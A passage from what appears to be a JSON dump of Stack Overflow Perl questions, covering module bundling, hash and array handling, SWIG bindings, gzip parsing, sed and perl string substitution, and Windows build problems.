on a remote server, I have to cpanm to re-install all the modules, which has the following issues:</p>\n\n<ul>\n<li>Slow.</li>\n<li>Cannot include private module / private patch</li>\n<li>Would install the latest version of modules, instead of the ones that I am working on.</li>\n</ul>\n\n<p>So I want to redistribute them when I deploy. I could almost use PAR, but I can't because I don't want want to do that in binary form - as the Perl version, architecture might be different.</p>\n\n<p><code>Module::Install::Bundle</code> is the closet I have found. Upon specifying the prereq, it can auto fetch the modules and all its dependencies (up to core module) from CPAN. Module does build and test, but \"make install\" does nothing - it doesn't install those prereq at all.</p>\n\n<p>Is there something I have missed?</p>\n\n<p>I am using Strawberry Perl on Windows.</p>\n"},{"tags":["perl","svn"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12533501,"title":"Update config file for script via svn checkout","body":"<p>I need to write a script that is able to logon to an svn repository and checkout a config file for a script I am running on a lot of servers.</p>\n\n<p>Perl is the only scripting language that I can use but I'm a complete novice in perl.</p>\n\n<p>Could someone point me in the right direction and maybe give me some links with examples and/or documentation.</p>\n\n<p>UPDATE:I can't install svn on the remote servers. Is it impossible to do without installing svn?</p>\n\n<p>GÃ­sli</p>\n"},{"tags":["perl","random"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":198,"score":4,"question_id":5993439,"title":"How big can the argument to Perl's rand be?","body":"<p><code>rand(n)</code> returns a number between <code>0</code> and <code>n</code>. Will <code>rand</code> work as expected, with regard to \"randomness\", for all arguments up to the integer limit on my platform?</p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":12535408,"title":"Perl How do I retrieve an array from a hash of arrays?","body":"<p>I'm fairly new to Perl, so forgive me if this seems like a simple question...</p>\n\n<p>Anyway, I have a hash of arrays and I'm trying to retrieve one of the arrays in the hash, but all I can get is the scalar size of the array.</p>\n\n<pre><code>%HoA = a hash of arrays\n$key = some key in the hash\n\nforeach $nextItem (@HoA{$key}) {\n  do a bunch of stuff with $nextItem\n}\n</code></pre>\n\n<p>When I do this, $nextItem is always just the size of the array and the loop only runs through one time.  I've tried printing the following:</p>\n\n<pre><code>@HoA{$key}\n$HoA{$key}\n@$HoA{$key}\n</code></pre>\n\n<p>The first two give me the scalar size and the third gives me nothing...what am I missing here?</p>\n\n<p>UPDATE:  I'm wondering if my problem is actually the way I'm adding the arrays to the hash.  Here's what I'm doing:</p>\n\n<pre><code>@HoA{$key} = split(/ /, $list);\n</code></pre>\n\n<p>Does that stick the array in the hash, or the array size in the hash?</p>\n\n<p>UPDATE 2: I tried the following block of code:</p>\n\n<pre><code>my $key = \"TEST\";\nmy %HoA = ();\nmy @testarray = (1, 2, 3);\n@HoA{$key} = @testarray;\nprint Dumper(%HoA);\n</code></pre>\n\n<p>Here's the output:</p>\n\n<pre><code>$VAR1 = 'TEST';\n$VAR2 = 1;\n</code></pre>\n\n<p>Why is it only sticking the first value of the array in?</p>\n"},{"tags":["perl","swig"],"answer_count":2,"favorite_count":1,"up_vote_count":31,"down_vote_count":1,"view_count":606,"score":30,"question_id":11157157,"title":"STL map in Perl using SWIG","body":"<p>This is duplicate of my <a href=\"http://sourceforge.net/mailarchive/forum.php?thread_name=102641339869909@webcorp7.yandex-team.ru&amp;forum_name=swig-user\">question on SWIG mailing list</a>.</p>\n\n<p>I am trying to use stl containers in my SWIG bindings. Everything works perfectly except for stl map handling in Perl. On C++ side, I have</p>\n\n<pre><code>std::map&lt;std::string, std::string&gt; TryMap(const std::map&lt;std::string, std::string&gt; &amp;map) {\n  std::map&lt;std::string, std::string&gt; modified(map);\n  modified[\"7\"] = \"!\";\n  return modified;\n}\n</code></pre>\n\n<p>SWIG config look like this</p>\n\n<pre><code>%module stl\n\n%include \"std_string.i\"\n\n%include \"std_map.i\"\n%template(StringStringMap) std::map&lt;std::string, std::string&gt;;\n\n%{\n  #include \"stl.h\"\n%}\n\n%include \"stl.h\"\n</code></pre>\n\n<p>In my Python script I can call TryMap this way</p>\n\n<pre><code>print dict(stl.TryMap({'a': '4'}))\n</code></pre>\n\n<p>and get beautiful output</p>\n\n<pre><code>{'a': '4', '7': '!'}\n</code></pre>\n\n<p>but in Perl I call</p>\n\n<pre><code>print Dumper stl::TryMap({'a' =&gt; '4'});\n</code></pre>\n\n<p>and get an error</p>\n\n<pre><code>TypeError in method 'TryMap', argument 1 of type 'std::map&lt; std::string,std::string &gt; const &amp;' at perl.pl line 7.\n</code></pre>\n\n<p>I can actually do something like</p>\n\n<pre><code>my $map = stl::TryMap(stl::StringStringMap-&gt;new());\nprint $map-&gt;get('7');\n</code></pre>\n\n<p>and get '!', but this is not an option because there is a lot of legacy code using \"TryMap\" that expects normal Perl hash as its output.</p>\n\n<p>I believe there is a way work this out because SWIG solves this particular problem nicely in Python and even in Perl if I use stl vectors and strings but not maps.</p>\n\n<p>Is there any way to handle stl map with Perl in SWIG? I am using latest SWIG 2.0.7</p>\n\n<p><strong>UPDATE</strong> Maybe there is something wrong with <code>perl5/std_map.i</code>. It is too short =)</p>\n\n<pre><code>$ wc -l perl5/std_map.i python/std_map.i \n   74 perl5/std_map.i\n  305 python/std_map.i\n</code></pre>\n"},{"tags":["perl","shell","tips-and-tricks","tricks"],"answer_count":24,"favorite_count":13,"up_vote_count":16,"down_vote_count":4,"view_count":8443,"score":12,"question_id":111868,"title":"What is your latest useful Perl one-liner (or a pipe involving Perl)?","body":"<p>The one-liner should:</p>\n\n<ul>\n<li>solve a real-world problem</li>\n<li>not be extensively cryptic (should be easy to understand and reproduce)</li>\n<li>be worth the time it takes to write it (should not be too clever)</li>\n</ul>\n\n<p>I'm looking for practical tips and tricks (complementary examples for <code>perldoc perlrun</code>).</p>\n"},{"tags":["c","perl","swig"],"answer_count":2,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":682,"score":3,"question_id":1051496,"title":"How do I build a Perl hash in C, using SWIG?","body":"<p>I'm trying to create a Perl hash from within a C library. Here's what I've got so far:</p>\n\n<pre><code>static void add_string_to_perl_hash ( HV *hv, char * key, char *value ) {\n\nSV *obj = sv_2mortal(newSVpv(value, 0));\n\nhv_store(hv, (const char *)key, strlen (key), obj, 0);\n\nSvREFCNT_inc(obj);\n\n}\n\nSV * do_get_test_hash () {\n\n    static char *foo =\"foo\";\n    static char *bar =\"bar\";\n\n    HV *hv;\n\n    hv = newHV();\n    add_string_to_perl_hash ( hv, \"foo\",   foo);\n    add_string_to_perl_hash ( hv, \"bar\",   bar);\n\n    return sv_2mortal(newRV_noinc((SV*)hv));\n}\n</code></pre>\n\n<p>Trying it out: I don't get anything that makes any sense to me:</p>\n\n<pre><code>use testlib;\nuse Data::Dumper;\n\nprint Dumper (testlib::do_get_test_hash());\n\n$VAR1 = bless( do{\\(my $o = 5359872)}, '_p_SV' );\n</code></pre>\n\n<p>Ideas?</p>\n"},{"tags":["c++","linux","perl","pipe"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":88,"score":1,"question_id":12542134,"title":"linux stdout pipe issues","body":"<p>I have a server program just writes output log to STDOUT.\nI also have another Perl shell script named \"logfile\" ,it will gets data from STDIN  and shows some output.</p>\n\n<pre><code>linux$ server |  logfile\n</code></pre>\n\n<p>at first  log-file has output ,but after a few moments it stops..\nis there anyone has came across this problem? </p>\n"},{"tags":["php","perl"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":978,"score":3,"question_id":5208323,"title":"Where to get php_perl.dll while pecl4win is down?","body":"<p>I need to call a Perl script from a PHP file, and I've gotten as far as know that I need the Perl class, and that it's in the php_perl.dll extension.  I've also downloaded the php_perl package from PECL, but as you know, it's just the source and needs to be compiled.  I don't work in C, so compiling it's not really an option -- I tried downloading Visual Studio Express but I still can't seem to make it happen.</p>\n\n<p>So I really need php_perl.dll, but <a href=\"http://pecl4win.php.net/ext.php/php_perl.dll\" rel=\"nofollow\">http://pecl4win.php.net/ext.php/php_perl.dll</a> just tells me that \"The pecl4win build box is temporarily out of service. We're preparing a new build system.\"  Surely there must be SOMEWHERE else I can get the DLL, but I can't seem to find it.  Every link I find seems to either be someone else looking for it, or a warez-looking site that wants you to give them your credit card info.</p>\n\n<p>Thanks...</p>\n\n<p>----  Nick</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12540613,"title":"How to repeatedly use a Perl file in another Perl file","body":"<p>I am doing the below steps:</p>\n\n<ul>\n<li>Read all the text files in a directory and store it in an array named <em>@files</em></li>\n<li>Run a foreach loop on each text file.\nExtract the file name(stripping of .txt) using split operation and creating a folder of that particular filename.\nRename that file to <em>Test.txt</em> (so as to work as input fo another perl executable)\nExecuting  test.pl for each file by adding the line <em>require \"test.pl\";</em></li>\n</ul>\n\n<p>It works fine for only one file, but not any more.\nHere is my code:</p>\n\n<pre><code>opendir DIR, \".\";\nmy @files = grep {/\\.txt/} readdir DIR;\n\nforeach my $files (@files) {\n\n    @fn = split '\\.', $files;\n    mkdir \"$fn[0]\" \n        or die \"Unable to create $fn[0] directory &lt;$!&gt;\\n\";\n\n    rename \"$files\", \"Test.txt\";\n    require \"test3.pl\";\n\n    rename \"Test.txt\", \"$files\";\n    system \"move $files $fn[0]\";\n}\n</code></pre>\n\n<p>Any help would be very grateful.</p>\n"},{"tags":["c","perl","wrapper","portability","suffix-tree"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":63,"score":1,"question_id":11646127,"title":"Include a Local Perl Module that References a Local C Library","body":"<p>I want to include a local module in a Perl script that's not installed. The code below seems to work for that purpose. However, the module I want to include is a wrapper for a C library. I do it as follows:</p>\n\n<pre><code>use FindBin;\nuse lib \"$FindBin::Bin/gray-tree-suffix-59e1c06/lib\";\nuse Tree::Suffix;\n</code></pre>\n\n<p>The Perl module is called <a href=\"https://github.com/gray/tree-suffix\" rel=\"nofollow\">Tree::Suffix</a> and acts as a wrapper for <a href=\"http://www.icir.org/christian/libstree/\" rel=\"nofollow\">libstree</a>. My question is, how do I reference the C library locally as well (given that it's not installed). </p>\n\n<p>I presume it would have something to do with the inner workings of the Perl module? I apologise if this is an amateurish question. Thank you!</p>\n"},{"tags":["xml","json","perl","data","go"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":103,"score":4,"question_id":12540057,"title":"Is there a Go Language equivalent to Perls' Dumper() method in Data::Dumper?","body":"<p>I've looked at the very similarly titled post (<a href=\"http://stackoverflow.com/questions/1098327/is-there-a-c-equivalent-to-perls-dumper-method-in-datadumper\">Is there a C equivalent to Perls' Dumper() method in Data::Dumper?</a>), regarding a C equivalent to <code>Data::Dumper::Dumper();</code>. I have a similar question for the Go language.</p>\n\n<p>I'm a Perl Zealot by trade, and am a progamming hobbyist, and make use of <code>Data::Dumper</code> and similar offspring literally hundreds of times a day. I've taken up learning Go, because it looks like a fun and interesting language, something that will get me out of the Perl rut I'm in, while opening my eyes to new ways of doing stuffz... One of the things I really want is something like:</p>\n\n<pre><code>fmt.Println(dump.Dumper(decoded_json))\n</code></pre>\n\n<p>to see the resulting data structure, like <code>Data::Dumper</code> would turn the JSON into an Array of Hashes. Seeing this in Go, will help me to understand how to construct and work with the data. Something like this would be considered a major lightbulb moment in my learning of Go.</p>\n\n<p>Contrary to the statements made in the C counterpart post, I believe we can write this, and since I'll be passing Dumper to Println, after compilation what ever JSON string or XML page I pass in and decode. I should be able to see the result of the decoding, in a Dumper lik state... So, does any more know of anything like this that exists? or maybe some pointers to getting something like this done? Thanks, I should probably admit, I'm 9 days into looking at Go.</p>\n"},{"tags":["perl","parsing","lisp","perl6"],"answer_count":3,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":350,"score":7,"question_id":8056404,"title":"Is it possible to implement lisp \"language\" in Perl 6?","body":"<p>In here, interpretation of <code>Hello $world</code> per each quoting symbol I mean <em>language</em>.</p>\n\n<pre><code> $world = \"WÎ©rlÎ´\"\n\"(Hell)*o $world\\n\"           # &lt;--- plain (Hell)*o, resolve $world, escape \\n\n'(Hell)*o $world\\n'           # &lt;--- plain (Hell)*o, plain $world, escape \\n\n/(Hell)*o $world\\n/           # &lt;--- regexp (Hell)*, resolve $world, interpret \\n\n&lt;(Hell)*o $world\\n&gt;           # &lt;--- make list [\"(Hello*o\", \"$world\\n\"]\n{(Hell)*o $world\\n}           # &lt;--- syntax error, this language cant' parse it\n</code></pre>\n\n<p>So is Perl 6 powerful enough to be able to exist in future language for something like</p>\n\n<pre><code>my $emacs_func = (defun perl-backward-to-start-of-continued-exp (lim)\n      (if (= (preceding-char) ?\\))\n          (forward-sexp -1))\n      (beginning-of-line)\n      (if (&lt;= (point) lim)\n          (goto-char (1+ lim)))\n      (skip-chars-forward \" \\t\\f\"))\n\n\n$  typeof($emacs_func)\n&gt; Emacs Lisp list\n</code></pre>\n\n<p>So, question obviously is: <strong><code>can it be done in present specification (or even implementation) of Perl 6</code></strong>?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":102,"score":1,"question_id":12536224,"title":"Does accessing @_ directly avoid a memory copy of a large scalar?","body":"<p>So while attempting to patch a bug recently, a fellow hacker told me that since the value of the string passed to the subroutine (method) might be quite large,  accessing it via <code>$_[1]</code> would avoid the memory copy. However, I thought that any value passed to a subroutine was copied to <code>@_</code> in the first place? so in the below example is the memory copied twice? or am I wrong about the copy made when passing to the method?</p>\n\n<pre><code>sub foo {\n    my $self = shift\n\n    $_[0]    # access $str in @_ directly\n    my ( $str ) = @_; # makes another copy of @_\n}\n\nsub bar {\n    my $self = shift;\n    my $str = 'something very large'; \n\n    $self-&gt;foo( $str ); #copies $str to the @_ of foo\n}\n</code></pre>\n\n<p>This is why I suggested to the author allowing pass by a scalar ref, which will avoid a copy (other than the reference itself ) when passing to the method itself. To reiterate: does passing a value to a subroutine mean the value gets copied into <code>@_</code>?</p>\n"},{"tags":["perl","parsing","gz"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":133,"score":0,"question_id":12536859,"title":"Perl - parsing huge *.gz file in Windows","body":"<p>I'm trying to parse big *.gz file using Perl in Windows. </p>\n\n<p>In Solaris I'm able to use following construction:</p>\n\n<pre><code>my $cmd = \"zcat $dir/$file|\";\nopen FILE, $cmd or die \"$cmd:$!\";\n\nwhile (&lt;FILE&gt;) {\n.\n.\n.\n}\n</code></pre>\n\n<p>and it works fine.\nIn Windows I'm tring to use <a href=\"http://search.cpan.org/perldoc?IO%3a%3aZlib\" rel=\"nofollow\">IO::Zlib</a> module, e.g.</p>\n\n<pre><code>my $fh = IO::Zlib-&gt;new(\"$file\", \"rb\");\nwhile (my $line = $fh-&gt;getline()) {\n.\n.\n}\n</code></pre>\n\n<p>but I'm running out of memory. (I have 4GB RAM on my system). Is there any other method to parse big *.gz file?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12537657,"title":"how to write a module function that overrides imported function in perl","body":"<p>I have a question: I want to write a method called \"copy\" for my module M. This function is a wrapper of the imported function File::Copy::copy. So I have to use File::Copy::copy and define my own copy. But it will have an error saying that copy is redefined. How to achieve my goal?</p>\n\n<pre><code>#M.pm\npackage M;\nuse File::Copy;\n\n#... constructor and other methods\n\nsub copy {\n  my $self = shift;\n  my $target = shift;\n  File::Copy::copy($self-&gt;{'PATH'},$target);\n}\n</code></pre>\n"},{"tags":["perl","sh","backticks"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12536871,"title":"Perl backticks when using pipes","body":"<p>I'm experiencing some problems trying to capture the output of a simple command:</p>\n\n<pre><code>$timeTotal = `echo $timeTotal + $time | bc -l`;\n</code></pre>\n\n<p>But I'm getting the following errors:</p>\n\n<pre><code>sh: +: not found\nsh: Syntax error: \"|\" unexpected\n</code></pre>\n\n<p>This command works perfectly in bash but it seems sh is being actually used. At the very beginning I thought that the problem is the pipe usage (although the sum is not well interpreted neither). What confuses me is that the following command in the same script causes no error and works properly:</p>\n\n<pre><code>my $time = `cat $out.$step | bc -l`;\n</code></pre>\n\n<p>Any suggestions?</p>\n"},{"tags":["perl","locale"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":38,"score":2,"question_id":12521713,"title":"is there a way to find list of valid locales in my linux using perl?","body":"<p>I need to find a list of locale installed/supported in my linux machine.\nis there a way to find a list of valid locales in my linux using perl ?</p>\n\n<p>thanks</p>\n"},{"tags":["perl","shell","unix","sed","nawk"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":92,"score":1,"question_id":12534271,"title":"Getting error in substituting special characters with sed/perl","body":"<p>I am trying to substitute few special characters using sed/perl for which I am getting errors.  </p>\n\n<p>In below command i am trying to replace values for SEARCHFIELDAPP, OLD_STRING,NEW_STRING etc;</p>\n\n<pre><code>Server1&gt; SERVER_COMMAND=\"perl -F'\\|' -i -lape  'if (\\$F[0] eq \\\"SEARCHFIELDAPP\\\" &amp;&amp; \\$F[1] eq \\\"SEARCHFIELDDB\\\" &amp;&amp; \\$F[6] eq \\\"SEARCHFIELDUNM\\\" )  { s/\\|OLD_STRING\\|/\\|NEW_STRING\\|/g; s/\\|LAST_UPDATE_DT/\\|CURR_UPDATE_DT/g }' \" \n</code></pre>\n\n<p>Above command is as shown below when printed on console.</p>\n\n<pre><code>Server1&gt; echo $SERVER_COMMAND\nperl -F'\\|' -i -lape 'if ($F[0] eq \"SEARCHFIELDAPP\" &amp;&amp; $F[1] eq \"SEARCHFIELDDB\" &amp;&amp; $F[6] eq \"SEARCHFIELDUNM\" ) { s/\\|OLD_STRING\\|/\\|NEW_STRING\\|/g; s/\\|LAST_UPDATE_DT/\\|CURR_UPDATE_DT/g }'\n</code></pre>\n\n<p>In above command string, I am trying to replace few Strings: </p>\n\n<pre><code>Server1&gt; echo $SERVER_COMMAND | sed -e \"s|SEARCHFIELDAPP|ALLOWSERVICE|;s|SEARCHFIELDDB|DataDup|;s|SEARCHFIELDUNM|mogga|;s|OLD_STRING|mogga_dev_$%^|;s|NEW_STRING|mogga&amp;*%^$|;s|LAST_UPDATE_DT|09-21-2012:11:09:41|;s|CURR_UPDATE_DT|09-21-2012:11:18:17|;\"\n</code></pre>\n\n<p>When I do that I am getting an output as shown below:</p>\n\n<pre><code>perl -F'\\|' -i -lape 'if ($F[0] eq \"ALLOWSERVICE\" &amp;&amp; $F[1] eq \"DataDup\" &amp;&amp; $F[6] eq \"mogga\" ) { s/\\|mogga_dev_$%^\\|/\\|moggaNEW_STRING*%^$\\|/g; s/\\|09-21-2012:11:09:41/\\|09-21-2012:11:18:17/g }'\n</code></pre>\n\n<p>Problem here is with substitution  <strong>s|NEW_STRING|mogga&amp;*%^$|;</strong> . I was expecting <strong>NEW_STRING</strong> to be replaced with <strong>mogga&amp;*%^$</strong>  but it is getting replaced with <strong>moggaNEW_STRING*%^$</strong>.  </p>\n\n<p>Here <strong>&amp;</strong>  is getting interpreted as <strong>NEW_STRING</strong>. When I escape <strong>&amp;</strong>, it works fine. But I get this string from a parent script which i use in child script dynamically. I am looking for some way to successfully substitute string as it is, without escaping any character. Escaping will make me to modify incoming string with escape character which i want to avoid. </p>\n\n<p>I tried the same by using perl one liner for substitution. But here also i am facing similar issue with special character.</p>\n\n<pre><code>Server1&gt; echo $SERVER_COMMAND |  perl -p -i -e 's|SEARCHFIELDAPP|ALLOWSERVICE|;s|SEARCHFIELDDB|DataDup|;s|SEARCHFIELDUNM|mogga|;s|OLD_STRING|mogga_dev_$%^|;s|NEW_STRING|mogga&amp;*%^|;s|LAST_UPDATE_DT|09-21-2012:11:09:41|;s|CURR_UPDATE_DT|09-21-2012:11:18:17|;'\n</code></pre>\n\n<p>Below is how it looks after substitution:</p>\n\n<pre><code>perl -F'\\|' -i -lape 'if ($F[0] eq \"ALLOWSERVICE\" &amp;&amp; $F[1] eq \"DataDup\" &amp;&amp; $F[6] eq \"mogga\" ) { s/\\|mogga_dev_0^\\|/\\|mogga&amp;*%^\\|/g; s/\\|09-21-2012:11:09:41/\\|09-21-2012:11:18:17/g }'\n</code></pre>\n\n<p>I am seeing string <strong>OLD_STRING</strong> which was suppose to get replaced with string <strong>mogga_dev_$%^</strong> got replaced with <strong>mogga_dev_0^</strong>.   Here <strong>$%</strong> is getting converted to <strong>0</strong> </p>\n\n<p>In this case as well i get what expect by escaping problematic characters.</p>\n\n<p>Can you please let me know how to avoid this interpretation apart from escaping special characters? </p>\n\n<p>Thanks</p>\n\n<hr>\n\n<p>After William's inputs I was able to achieve below without errors:</p>\n\n<pre><code>perl -F'\\|' -i -lape 'if ($F[0] eq \"ALLOWSERVICE\" &amp;&amp; $F[1] eq \"DataDup\" &amp;&amp; $F[6] eq \"mogga\" ) { s/\\|mogga_dev_!$%^\\|/\\|mogga!&amp;*%^$@*&amp;^%\\|/g; s/\\|09-21-2012:11:09:41/\\|09-21-2012:11:18:17/g }'\n</code></pre>\n\n<p>But when I execute this on a file for substitution. I am not seeing string <strong>mogga_dev_!$%^</strong> is not getting replaced with <strong>mogga!&amp;<em>%^$@</em>&amp;^%</strong> in the file. </p>\n\n<p>Since special characters are not escaped, I think replacement is not happening. But I dont want to use escaping to escape special characters. Can you please help me with some other method in replacing string with special characters in file?</p>\n\n<p>Thanks</p>\n"},{"tags":["perl","cpan"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":144,"score":0,"question_id":12506906,"title":"Why can't cpan install XML::LibXML?","body":"<p>This is really weird, can someone explain why GCC can not find an include file when installing <a href=\"https://metacpan.org/release/XML-LibXML\" rel=\"nofollow\">XML::LibXML</a>?</p>\n\n<pre><code>&gt; cpan PAJAS/XML-LibXML-1.70.tar.gz\n...\nC:/CPANTE~1/PERL51~1.0_6/site/bin/gcc.exe -c    -DNDEBUG -DWIN32 -D_CONSOLE -DNO_STRICT -DWIN64 -DCONSERVATIVE -DPERL_TEXTMODE_SCRIPTS -DUSE_SITECUSTOMIZE -DPERL_IMPLICIT_CONTEXT -DPERL_IMPLICIT_SYS -DUSE_PERLIO -DHASATTRIBUTE -fno-strict-aliasing -mms-bitfields -O2 -DVERSION=\\\"1.70\\\" -DXS_VERSION=\\\"1.70\\\"  \"-IC:\\CPANTesters\\Perl5.16.0_64\\lib\\CORE\"  -DHAVE_UTF8 -DHAVE_BLANK LibXML.c\nLibXML.xs:34:31: fatal error: libxml/xmlversion.h: No such file or directory\n\n&gt; IF EXIST %INCLUDE%\\libxml\\xmlversion.h ECHO Cogito ergo sum\nCogito ergo sum\n</code></pre>\n\n<p>This is ActiveState 5.16.0 64 bit with MinGW64.</p>\n\n<p>I decide to drop using Zlatkovic Win32 binaries <a href=\"ftp://ftp.zlatkovic.com/pub/libxml/\" rel=\"nofollow\">ftp://ftp.zlatkovic.com/pub/libxml/</a>, and use the 64 bit binaries available at <a href=\"http://ftp.gnome.org/pub/GNOME/binaries/win64/dependencies/\" rel=\"nofollow\">http://ftp.gnome.org/pub/GNOME/binaries/win64/dependencies/</a>.</p>\n\n<p>The problem above is solved by going to the unpacked module and execute this command:</p>\n\n<pre><code>&gt; perl Makefile.PL INC=-IC:\\CPANTesters\\bin\\gnome-deps-win64\\include LIBS=-LC:\\CPANTesters\\bin\\gnome-deps-win64\\lib\n&gt; dmake \n</code></pre>\n\n<p>But problem arises from running dmake test since Perl crashes on all test files.</p>\n\n<pre><code>C:\\CPANTesters\\Perl5.16.0_64\\bin\\perl.exe \"-MExtUtils::Command::MM\" \"-e\" \"test_harness(0, 'blib\\lib', 'blib\\arch')\" t/*.t\nt/01basic.t ......................... Dubious, test returned 38 (wstat 9728, 0x2600)\nFailed 3/3 subtests\n</code></pre>\n\n<p>Any idea on how to debug this?</p>\n"},{"tags":["windows","linux","perl","registry"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":66,"score":1,"question_id":12535154,"title":"use Win32::Registry gives problems in Linux machine","body":"<p>My perl script must run on windows as well as Linux server. As the script runs, I have to update the registry for specific things. When I use \"use Win32::Registry\" It works fine on windows but on Linux it gives errors regardless of the following if statement.</p>\n\n<pre><code>if ($OS =~ /Windows/ )\n{\nuse Win32::Registry;\n...\n...\n}\n</code></pre>\n\n<p>In my view, perl loads \"use\" at compilation time and that must be the problem. What can I do so that Perl does not load use win 32 command when running on Linux?</p>\n\n<p>I tried using </p>\n\n<pre><code>if ($OS =~ /Windows/ )\n{\nrequire Win32::Registry;\n...\n...\n} \n</code></pre>\n\n<p>with this, the script runs fine on both servers but it saves binary values in registry and not string value.</p>\n\n<p>So how can I make the Perl script run on both servers and save string values in registry?</p>\n\n<p>Thank you.</p>\n"},{"tags":["perl","qualifiers"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":73,"score":1,"question_id":12533546,"title":"perl -- sorting a comma-separated source that has \"qualifiers\"","body":"<p>I'm a weak perl user (and manipulator of arrays), and this problem is stumping me. Hope someone can help!</p>\n\n<p>I have a source file with the following type of data (greatly simplified):</p>\n\n<pre><code>URL: 22489196\nKeywords: Ball, Harga, Call, Dall, Eall, Jarga, Fall\n\nURL: 22493265\nKeywords: Hall, Iall, Yarga, Jall, Zarga, Kall\n</code></pre>\n\n<p>The words interrupting the alpha order (Harga, etc.) are \"qualifiers\". The end result I need is:</p>\n\n<pre><code>22489196\n\nBall--Harga\nCall\nDall\nEall--Jarga\nFall\n\n22493265\n\nHall\nIall--Yarga\nJall--Zarga\nKall\n</code></pre>\n\n<p>I've tried various \"for\" loops, pushing the terms into a second array and shifting the original array on conditional concatenation of its terms, but I still end up with missing or extra terms. Can anyone suggest how this might be done? MANY THANKS in advance!</p>\n\n<blockquote>\n  <blockquote>\n    <p>ADDED: here's one iteration of part of my messy code:</p>\n  </blockquote>\n</blockquote>\n\n<pre><code>while (&lt;FILE&gt;) {\n\n    if (/URL\\:/) {\n\n        print \"$_\\n\";\n    }\n\n    if (/Keywords\\: /) {\n\n        s/Keywords\\: //;\n        chomp();\n\n        my @terms    = split ', ', $_;\n        my @bakterms = reverse @terms;\n        my $noTerms  = @terms;\n        my $IzItOdd  = $noTerms%2;\n        #my $ctr = $noTerms++;\n\n        for ($i = 0; $i &lt;= $#bakterms; $i++){\n\n            my $j = $i+1;\n\n            if ($j &lt;= $#bakterms) {\n\n                my $one = $bakterms[$i];\n                my $two = $bakterms[$j];\n\n                if ($two gt $one) { # i.e., if $two is alphabetically AFTER $one\n\n                    push @ary3, $bakterms[$i];\n                    $disarry = 1;\n                    my $interloper = $bakterms[$j+1].= \"--\" . $two;\n                    push @ary3, $interloper;\n                    shift @bakterms;\n                    #$ctr--;\n                    shift(@bakterms);\n                    #$ctr--;\n                }\n                else {\n\n                    push @ary3, $bakterms[$i];\n                    #shift(@bakterms);\n                    shift @bakterms;\n                    $disarry = 0;\n                }\n            }\n        }\n        @ary3 = sort @ary3;\n\n        foreach my $term (@ary3) {\n\n            print \"** $term\\n\";\n        }\n\n        @ary3 = ();\n        print\"\\n\";\n    }\n}\nexit 0;\n</code></pre>\n"},{"tags":["arrays","perl","hash","concatenation"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12532735,"title":"How to add to a data-structure in Perl","body":"<p>I am not sure what to call the following data structure: Hash or Array.</p>\n\n<p>I am trying to add a 3rd element to it. Can someone please guide me. Some explanation would be much appreciated as I am new to perl and to this forum as well.</p>\n\n<p>Existing structure:</p>\n\n<pre><code>my $var= [\n          bless( {\n                   'name' =&gt; 'Name1',\n                   'groupid' =&gt; '2',\n                   'description' =&gt; 'Desc2'\n                 }, 'my_type' ),\n          bless( {\n                   'name' =&gt; 'Name2',\n                   'groupid' =&gt; '4',\n                   'description' =&gt; 'Desc3'\n                 }, 'my_type' ),\n];\n</code></pre>\n\n<p>I want to add the following into it:</p>\n\n<pre><code>bless( {\n       'name' =&gt; 'Name3',\n       'groupid' =&gt; '9',\n       'description' =&gt; 'Desc4'\n     }, 'my_type' ),\n</code></pre>\n\n<p>Thank you for your time and help!</p>\n"},{"tags":["perl","hash"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":75,"score":2,"question_id":12533017,"title":"Perl: Different ways to access nested hash keys","body":"<p>Im almost newbie in Perl. So just wondering about the differences between two ways of accessing a  value in nested hash.</p>\n\n<p>Consider the following hash:</p>\n\n<pre><code>my %hsh = ( \n    'fruits' =&gt; { \n        'red'    =&gt; 'apple', \n        'yellow' =&gt; 'banana', \n    },\n    'veg' =&gt; {\n        'red'    =&gt; 'capcicum',\n        'yellow' =&gt; 'lemon',\n    },\n);\n\n#way 1\nprint $hsh{'fruits'}{'red'}; \n\n#way 2\nprint $hsh{'fruits'}-&gt;{'red'};\n</code></pre>\n\n<p>Both has same output <code>apple</code>. But what is the difference between these two ways?</p>\n"},{"tags":["perl","moose"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":107,"score":3,"question_id":12483775,"title":"How to instantiate Moose classes from a big hash","body":"<p>I have a big hash many levels deep, and I'd like to turn this hash into a set of Moose classes.</p>\n\n<p>The hash looks something like this:</p>\n\n<pre><code>my %hash = (\n    company =&gt; {\n        id =&gt; 1,\n        name =&gt; 'CorpInc',\n        departments =&gt; [\n            {\n                id =&gt; 1,\n                name =&gt; 'Sales',\n                employees =&gt; [\n                    {\n                        id =&gt; 1,\n                        name =&gt; 'John Smith',\n                        age =&gt; '30',\n                    